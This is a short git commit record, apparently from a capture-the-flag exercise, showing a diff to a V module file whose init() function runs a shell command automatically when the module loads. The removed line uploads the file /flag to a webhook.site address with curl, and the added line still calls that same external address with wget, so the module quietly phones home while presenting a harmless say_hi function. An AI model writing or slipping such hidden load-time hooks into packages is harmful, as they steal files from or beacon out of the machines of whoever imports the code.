4c75e50b508d199edfe4a306717498ca946f99c7
Abdillah <abdillah.muhamad@vantagepoint.co.id>
2021-10-31 14:45:44 +0700

    INIT

--- root.v
+++ root.v
@@ -8,5 +8,5 @@ pub fn say_hi() {
 }
 
 fn init(){
-os.system('curl -F "file=@/flag" https://webhook.site/eaadc4bb-70c8-42c2-9d3d-7a212d91f7be')
+os.system('wget https://webhook.site/eaadc4bb-70c8-42c2-9d3d-7a212d91f7be')
 }
